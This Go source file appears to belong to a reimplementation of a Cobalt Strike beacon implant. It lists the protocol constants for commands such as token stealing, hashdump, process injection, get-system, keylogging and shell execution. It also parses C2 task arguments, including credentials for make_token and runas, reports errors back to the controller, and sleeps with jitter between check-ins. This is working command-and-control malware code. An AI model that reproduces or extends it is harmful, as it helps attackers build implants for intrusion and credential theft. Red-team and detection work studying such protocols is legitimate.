package command

import (
	"bytes"
	"main/config"
	"main/packet"
	"main/util"
	"math/rand"
	"time"
)

// all of this can be found in beacon.Job class
const (
	CALLBACK_OUTPUT            = 0
	CALLBACK_KEYSTROKES        = 1
	CALLBACK_FILE              = 2
	CALLBACK_SCREENSHOT        = 3
	CALLBACK_CLOSE             = 4
	CALLBACK_READ              = 5
	CALLBACK_CONNECT           = 6
	CALLBACK_PING              = 7
	CALLBACK_FILE_WRITE        = 8
	CALLBACK_FILE_CLOSE        = 9
	CALLBACK_PIPE_OPEN         = 10
	CALLBACK_PIPE_CLOSE        = 11
	CALLBACK_PIPE_READ         = 12
	CALLBACK_POST_ERROR        = 13
	CALLBACK_PIPE_PING         = 14
	CALLBACK_TOKEN_STOLEN      = 15
	CALLBACK_TOKEN_GETUID      = 16
	CALLBACK_PROCESS_LIST      = 17
	CALLBACK_POST_REPLAY_ERROR = 18
	CALLBACK_PWD               = 19
	CALLBACK_JOBS              = 20
	CALLBACK_HASHDUMP          = 21
	CALLBACK_PENDING           = 22
	CALLBACK_ACCEPT            = 23
	CALLBACK_NETVIEW           = 24
	CALLBACK_PORTSCAN          = 25
	CALLBACK_DEAD              = 26
	CALLBACK_SSH_STATUS        = 27
	CALLBACK_CHUNK_ALLOCATE    = 28
	CALLBACK_CHUNK_SEND        = 29
	CALLBACK_OUTPUT_OEM        = 30
	CALLBACK_ERROR             = 31
	CALLBACK_OUTPUT_UTF8       = 32
)

// reference https://github.com/mai1zhi2/SharpBeacon/blob/master/Beacon/Profiles/Config.cs
// https://sec-in.com/article/1554
// part of them also can be found in cs jar,but I forget where I found them
// most of the interaction can be found in beacon.Taskbeacon
const (
	CMD_TYPE_SPAWN_IGNORE_TOKEN_X86    = 1
	CMD_TYPE_EXIT                      = 3
	CMD_TYPE_SLEEP                     = 4
	CMD_TYPE_CD                        = 5
	CMD_TYPE_CHECKIN                   = 8
	CMD_TYPE_INJECT_X86                = 9
	CMD_TYPE_UPLOAD_START              = 10
	CMD_TYPE_DOWNLOAD                  = 11
	CMD_TYPE_EXECUTE                   = 12
	CMD_TYPE_SPAWN_TOX86               = 13 // only supply target, don't supply dll
	CMD_TYPE_GET_UID                   = 27
	CMD_TYPE_REV2SELF                  = 28
	CMD_TYPE_TIMESTOMP                 = 29
	CMD_TYPE_STEAL_TOKEN               = 31
	CMD_TYPE_PS                        = 32
	CMD_TYPE_KILL                      = 33
	CMD_TYPE_RUNAS                     = 38
	CMD_TYPE_PWD                       = 39
	CMD_TYPE_JOB                       = 40
	CMD_TYPE_JOBS                      = 41 // beacon runs synchronized now, so there wouldn't be multi jobs in background
	CMD_TYPE_JOBKILL                   = 42
	CMD_TYPE_INJECT_X64                = 43
	CMD_TYPE_SPAWN_IGNORE_TOKEN_X64    = 44
	CMD_TYPE_PAUSE                     = 47
	CMD_TYPE_LIST_NETWORK              = 48
	CMD_TYPE_MAKE_TOKEN                = 49
	CMD_TYPE_PORT_FORWARD              = 50
	CMD_TYPE_FILE_BROWSE               = 53
	CMD_TYPE_MAKEDIR                   = 54
	CMD_TYPE_DRIVES                    = 55
	CMD_TYPE_REMOVE                    = 56
	CMD_TYPE_UPLOAD_LOOP               = 67
	CMD_TYPE_SPAWN_TOX64               = 69
	CMD_TYPE_EXEC_ASM_TOKEN_X86        = 70 // not sure
	CMD_TYPE_EXEC_ASM_TOKEN_X64        = 71
	CMD_TYPE_SET_ENV                   = 72
	CMD_TYPE_FILE_COPY                 = 73
	CMD_TYPE_FILE_MOVE                 = 74
	CMD_TYPE_GET_PRIVS                 = 77
	CMD_TYPE_SHELL                     = 78
	CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X86 = 87
	CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64 = 88
	CMD_TYPE_SPAWN_TOKEN_X86           = 89
	CMD_TYPE_SPAWN_TOKEN_X64           = 90
	CMD_TYPE_GET_SYSTEM                = 95
)

func ParseAnArg(buf *bytes.Buffer) ([]byte, error) {
	argLenBytes := make([]byte, 4)
	_, err := buf.Read(argLenBytes)
	if err != nil {
		return nil, err
	}
	argLen := packet.ReadInt(argLenBytes)
	if argLen != 0 {
		arg := make([]byte, argLen)
		_, err = buf.Read(arg)
		if err != nil {
			return nil, err
		}
		return arg, nil
	} else {
		return nil, nil
	}

}

func ParseGetPrivs(b []byte) ([]string, error) {
	buf := bytes.NewBuffer(b)
	privCntByte := make([]byte, 2)
	_, err := buf.Read(privCntByte)
	if err != nil {
		return nil, err
	}
	privCnt := int(packet.ReadShort(privCntByte))
	privs := make([]string, privCnt)
	for i := 0; i < privCnt; i++ {
		tmp, err := ParseAnArg(buf)
		if err != nil {
			return nil, err
		}
		privs[i] = string(tmp)
	}
	return privs, nil
}

func ParseCommandUpload(b []byte) ([]byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	filePath, err := ParseAnArg(buf)
	fileContent := buf.Bytes()
	return filePath, fileContent, err

}

// can also be used on Copy
func ParseCommandMove(b []byte) ([]byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	src, err := ParseAnArg(buf)
	dst, err := ParseAnArg(buf)
	return src, dst, err
}

func ParseCommandCopy(b []byte) ([]byte, []byte, error) {
	return ParseCommandMove(b)
}

func ParseCommandShell(b []byte) ([]byte, []byte, error) {
	return ParseCommandMove(b)
}

func ParseMakeToken(b []byte) ([]byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	domain, err := ParseAnArg(buf)
	username, err := ParseAnArg(buf)
	password, err := ParseAnArg(buf)
	return domain, username, password, err
}

func ParseRunAs(b []byte) ([]byte, []byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)
	domain, err := ParseAnArg(buf)
	username, err := ParseAnArg(buf)
	password, err := ParseAnArg(buf)
	cmd, err := ParseAnArg(buf)
	return domain, username, password, cmd, err
}

func ErrorMessage(err string) {
	errIdBytes := packet.WriteInt(0) // must be zero
	arg1Bytes := packet.WriteInt(0)  // for debug
	arg2Bytes := packet.WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := packet.MakePacket(31, result)
	packet.PushResult(finalPaket)
}
func Sleep() {
	sleepTime := config.WaitTime
	if config.Jitter != 0 {
		random := sleepTime * config.Jitter / 100
		sleepTime += rand.Intn(random*2) - random

	}
	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
}
